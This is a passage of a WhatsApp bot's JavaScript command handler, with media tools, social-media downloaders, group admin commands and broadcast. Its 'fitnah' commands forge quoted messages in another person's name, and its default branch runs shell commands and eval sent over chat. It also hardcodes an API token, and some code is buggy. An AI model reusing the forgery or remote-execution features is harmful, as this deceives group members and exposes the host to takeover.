            })
            break
    case prefix+ 'slow':
            if (!isQuotedVideo) return fakegroup('Responde video UnU📸!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await pato.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            pato.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case prefix+ 'reverse':
            if (!isQuotedVideo) return fakegroup('Reponde video UnU')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await pato.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            pato.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case prefix+ 'tourl':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await pato.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('Responde video o imagen nwn')
            }
            break
//Upload Story WeA
    case prefix+ 'upswteks':
            if (!q) return fakestatus('El texto? ._.')
            pato.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case prefix+ 'upswimage':
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await pato.downloadMediaMessage(swsw)
            pato.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            pato.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('Responder imagen!')
            }
            break
    case prefix+ 'upswvideo':
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await pato.downloadMediaMessage(swsw)
            pato.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            pato.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('reponde video UnU!')
            }
            break
			case prefix+ 'fitnah':
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|Hola|Hola juga`)
            var gh = args.join(' ')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            pato.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
//MOBIL LEJEN
case prefix+ 'herolist':
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
faketokoforwaded(listt)
})
break
      case prefix+ 'herodetail':
        res = await herodetails(body.slice(12))
        her = `*Hero details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 

*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}
`
faketokoforwaded(her)
break
//Downloader
	case prefix+ 'play':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
        case prefix+ 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break
	case prefix+ 'ytmp3':
			if (args.length === 0) return reply(`Enviar pedido *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Datos obtenidos con éxito!*\n\n*Titulo* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Para duraciones superiores al límite se presentan en el enlace_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Ten paciencia, estoy enviando el archivo T~T_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
 		case prefix+ 'ytmp4':
			if (args.length === 0) return reply(`Enviar *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captionsYtmp4 = `*Archivo encontrado!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Ten paciencia, estoy enviando el archivo T~T_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
	case prefix+ 'ytsearch':
			if (args.length < 1) return reply('Que buscare? O.O')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await pato.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Duracion: ' + video.timestamp + '\n'
            ytresult += '❏ Subida: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SATANCITO ᵈᵃʳʸ⛥*'
    		await fakethumb(tbuff,ytresult)
			break
    case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Link?')
        reply(mess.wait)
	    igdl(args[0])
	    .then(async(result) => {
            for (let ink of result.url_list)	{
            if (ink.includes('.mp4')){
            const igvdl = await getBuffer(ink)	
	    pato.sendMessage(from,igvdl,video,{mimetype:'video/mp4',quoted:mek,caption:'Etto.UvU'})
            } else if (ink.includes('.jpg')){
            const igpdl = await getBuffer(ink)
            pato.sendMessage(from,igpdl,image,{mimetype:'image/jpeg',quoted:mek,caption:'Etto UvU'})
	    }
            }
	    })
	    break
    case prefix+ 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case prefix+ 'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Link?')
            ten = args[0]
            var res = await twitterGetUrl(`${ten}`)
            .then(g => {
            ren = `${g.download[2].url}`
            sendMediaURL(from,ren,'DONE')
            })
            break
 	case prefix+ 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Link?')
 		reply(mess.wait)
		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		console.log(result)
    		const { videonowm, videonowm2, text } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${videonowm2}`)
    		.then(async (a) => {
    		me = `*Title* : ${text}\n*Link* : ${a.data}`
		pato.sendMessage(from,{url:`${videonowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case prefix+ 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Link?')
 		reply(mess.wait)
 		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		const { music,text } = result
		pato.sendMessage(from,{url:`${music}`},audio,{mimetype:'audio/mp4',filename : `${text}`,quoted:mek})
		})
     		.catch(e => console.log(e))
     		break
    case prefix+ 'fb':
            if (!q) return reply('Link?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            fakestatus(mess.wait)
            Fb.getInfo(`${te}`)
            .then(G => {
            ten = `${G.download.sd}`
            tek = `${G.title}`
            sendMediaURL(from,ten,`*Title* : ${tek}\n\n*Link* : ${ten}`)
           .catch((error) => {
            reply('lo siento hermano:('); 
            })
})
            break 
//Learn
case prefix+ 'brainly':
			if (args.length < 1) return reply('Que clase de pregunta es esa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pregunta:* ${Y.pertanyaan}\n\n*➸ Respuesta:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			pato.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
            })              
			break
case prefix+ 'google':
      if(!q) return reply('Yang mau di cari afa?')
			.then(res => res.json())
			afanya = args.join(' ')
			gogel = await axios.get(`https://shot.screenshotapi.net/screenshot?token=D2TDY3F-G5YMM94-K9JEQT8-FYBDQBB&url=https://www.google.com/search?q=${afanya}&safe=strict&sxsrf=ALeKk03WtBNqunvK303Qm3aEToejzpQvag%3A1621384426733&source=hp&ei=6lykYJbUKtPmz7sP-MugmAU&oq=p&gs_lcp=ChFtb2JpbGUtZ3dzLXdpei1ocBADMgQIIxAnMgQIIxAnMgQIIxAnMggIABCxAxCDATIFCAAQsQMyBQguELEDMggIABCxAxCDATIICAAQsQMQgwE6BwgjEOoCECdQlg9Ylg9g9hJoAXAAeACAAVmIAVmSAQExmAEAoAEBsAEP&sclient=mobile-gws-wiz-hp&full_page=true&fresh=true&output=json&file_type=png&wait_for_event=load`)
			bupnyah = await getBuffer(gogel.data.screenshot)
			pato.sendMessage(from, bupnyah, image, {quoted: mek, sendEphemeral: true})
			.catch(err => {
				return('Mengulang lord ada yg mengerror...')
			})
			break
	//Group Feature
case prefix+ 'add':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args.length < 1) return reply('A quien quieres agregar oni chan O~O?')
if (args[0].startsWith('08')) return reply('Utilice el código de país')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
pato.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('No se pudo agregar el objetivo, tal vez porque en privado')
}
break
case prefix+ 'kick':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag yg ingin angda tusbol!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = '*Adios putito >:] :* '
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
pato.groupRemove(from, mentioned)
					} else {
mentions(`byee.. @${mentioned[0].split('@')[0]}`, mentioned, true)
pato.groupRemove(from, mentioned)
}
break
case prefix+ 'promote':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Promovido Mi niñ@ lind@ UwU\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(from, mentioned, true)
pato.groupRemove(from, mentioned)
} else {
mentions(`Ok @${mentioned[0].split('@')[0]} kamu jadi admin!`, mentioned, true)
pato.groupMakeAdmin(from, mentioned)
}
break
case prefix+ 'demote':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Degradar con éxito UnU\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
pato.groupRemove(from, mentioned)
} else {
mentions(`Oke @${mentioned[0].split('@')[0]} kamu gak admin lagi yaa!`, mentioned, true)
pato.groupDemoteAdmin(from, mentioned)
}
break//DONE
    case prefix+ 'fitnahpc':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await pato.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await pato.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case prefix+ 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            pato.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break
 	case prefix+ 'hidetag':
			if (!mek.key.fromMe) return fakestatus('SATANCITO ᵈᵃʳʸ⛥')
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await pato.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			pato.sendMessage(from, optionshidetag, text)
			break
    case prefix+ 'sticktag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pato.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pato.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pato.sendMessage(from, ini_buffer, MessageType.sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
		    case prefix+ 'giftag':
		      //by Dehanjing
                if (!isQuotedVideo) return reply(`Reply Gif nya dengan caption ${prefix + command}`)
                quoted = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                download = await pato.downloadMediaMessage(quoted)
                await fs.writeFileSync(`giftag.gif`, download)
                var group = await pato.groupMetadata(from)
                var member = group['participants']
                var mem = []
                member.map(async adm => {
                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                thumb = fs.readFileSync(`giftag.gif`)
                pato.sendMessage(from, thumb, video, { contextInfo: {mentionedJid: mem }, quoted: mek, mimetype: 'video/gif', thumbnail: thumb })
			    await fs.unlinkSync(`giftag.gif`)
			    break
			case prefix+ 'doctag':
			  //by Dehanjing
		        if (!isQuotedDocument) return amek.reply(from, `Reply Document dengan caption *${prefix + command}*`, mek)
                quoted = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                download = await pato.downloadMediaMessage(quoted)
                await fs.writeFileSync(`doc.txt`, download)
                var group = await pato.groupMetadata(from)
                var member = group['participants']
                var mem = []
                member.map(async adm => {
                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                pato.sendMessage(from, fs.readFileSync(`doc.txt`), document, { contextInfo: {mentionedJid: mem }, quoted: mek, mimetype: 'text/plain' })
			    await fs.unlinkSync(`doc.txt`)
			    break
    case prefix+ 'kontag':
            if (!mek.key.fromMe) return reply('SATANCITO ᵈᵃʳʸ⛥')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            pato.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case prefix+ 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pato.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pato.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pato.sendMessage(from, ini_buffer, MessageType.sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pato.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pato.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pato.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pato.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pato.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pato.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pato.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pato.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pato.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`responde a un video imagen o sticker con : ${prefix}totag`)
        }
        break
//OTHER 
    case prefix+ 'join':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Ingrese el enlace del grupo')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('asegúrese de que el enlace sea correcto T-T!')
            var response = await pato.acceptInvite(codeInvite)
            fakestatus('Lito')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break
    case prefix+ 'runtime':
    case prefix+ 'test':
            run = process.uptime() 
            teks = `${kyun(run)}`
            fakegroup(teks)
            break  
	case prefix+ 'speed':
	case prefix+ 'ping':
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			fakegroup(pingnya)
			})
			break  

//Maker

case prefix+ 'bc':
					if (!isMe) return reply('No eres mi dueño UnU...')
					if (args.length < 1) return reply('.......')
					const more = String.fromCharCode(8206)
                    const readmore = more.repeat(4001)
					anu = await pato.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await pato.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							pato.sendMessage(_.jid, bc, image, {caption: `${body.slice(4)}\n> Izin Broadcast`, sendEphemeral: true})
						}
						reply('Lito')
					} else {
						for (let _ of anu) {
							sendMess(_.jid,`${body.slice(4)}` + readmore + `\n>Broadcast`)
						}
						reply('Lito UwU')
					}
					break
					case prefix+ 'level':
                if (!isGroup) return reply(mess.only
.group)
                const Level = getLevelingLevel(sender)
                const Xp = getLevelingXp(sender)
                if (Level === undefined && Xp === undefined) return reply('Etto O^O?')
                const requiredXp = 5000 * (Math.pow(2, Level) - 1)
                resul = `┌──⫶ *Nivel* ⫶──\n├ *Nombre* : ${pushname}\n├ Número : wa.me/${sender.split("@")[0]}\n├ XP :  ${Xp}/${requiredXp}\n└ Nivel : ${Level}`
                faketokoforwaded(resul, text, numbernye, per)
				break 
				case prefix+ 'narutod':
				oi = body.slice(8)
				oii = await getBuffer(`https://patoapi.herokuapp.com/api/photooxy/naruto?text=${oi}`)
				pato.sendMessage(from, oii, image, {quoted: mek, caption: 'Ok brother'})
				break
				
//END BANG RAKIT SENDIRI YAA DAN JGN LUPA KASIH NAMA SAYA YG SUDAH MENGBANGUN INI SC :(

default:

if (budy.startsWith('$')){
                        if (!isMe) return 
                            var konsol = budy.slice(2)
                        exec(konsol, (err, stdout) => {
                            if(err) return reply(`${err}`)
                                if (stdout) {
                                    reply(`${stdout}`)
                                    console.log('\x1b[1;37m>', '[', '\x1b[1;36mEVALL\x1b[1;37m', ']', time, color("$", "aqua"), 'from', color(senderme.split('@')[0]), 'args :', color(args.length))
                                }
                            })
                    } 
                    if (budy.startsWith('>')){
                        if (!isMe) return
                            var konsol = budy.slice(2)
                            function _return(sul) {
                            var sat = JSON.stringify(sul, null, 2)
                            var bang = util.format(sat)
                            return reply(bang)
                        }
                        try {
                            reply(util.format(eval(`;(async () => { ${konsol} })()`)))
                            console.log('\x1b[1;37m>', '[', '\x1b[1;36mEVALL\x1b[1;37m', ']', time, color(">", "aqua"), 'from', color(senderme.split('@')[0]), 'args :', color(args.length))
                        } catch (e) {
                              err = String(e)
                                reply(err)
                            }
                        } else {
                            if (budy != undefined) {
                                //console.log('>', '[',color('INGFO','red'),']',`Message : ${budy} From`, color(senderme.split('@')[0]))
                            } 
                        }
                        if (!budy.startsWith('$')) return
                            if (!budy.startsWith('>')) return
                        }

                
if (isGroup && budy != undefined) {
	} else {
	console.log(color('> [ JAPRI ]', 'red'), 'WEA', color(sender.split('@')[0]))
	}
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Error : %s', color(e, 'red'))
	console.log(e)
        }
	}
})
}
starts()
